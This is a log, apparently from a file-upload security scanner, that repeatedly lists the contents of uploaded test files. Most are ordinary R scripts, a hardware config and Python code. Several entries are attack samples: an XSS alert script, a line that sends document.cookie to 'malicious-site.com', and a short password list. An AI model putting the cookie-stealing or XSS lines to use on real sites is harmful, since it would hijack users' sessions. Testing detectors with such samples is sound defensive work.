2025-02-22 21:02:09,748 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:02:09,749 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:02:09,750 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,751 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,752 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,753 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:02:09,755 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,756 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,758 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:02:09,759 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:02:09,760 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:02:09,762 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:02:09,763 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,764 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,765 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,766 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:02:09,768 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,769 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,770 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,771 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,772 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,773 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:02:09,774 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,775 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,776 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,777 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,778 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,779 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:02:09,780 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,781 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,782 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,783 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,785 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,785 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:02:09,787 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,788 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,789 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:02:09,790 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:02:09,791 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:02:09,792 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:02:09,794 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,795 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,796 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,797 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:02:09,799 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,800 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,801 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:02:09,802 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:02:09,803 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:02:09,805 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:02:09,806 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,807 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,808 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,809 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:02:09,811 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,811 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,813 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:02:09,814 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:02:09,815 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:02:09,817 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:02:09,818 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,819 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,820 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,821 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:02:09,823 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,824 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,825 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:02:09,827 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:02:09,828 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:02:09,829 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:02:09,830 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,832 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,833 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,834 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:02:09,836 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,837 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:02:09,838 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,839 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,840 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,841 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:02:09,842 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,843 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,844 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,845 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,846 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,847 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:02:09,848 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,849 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
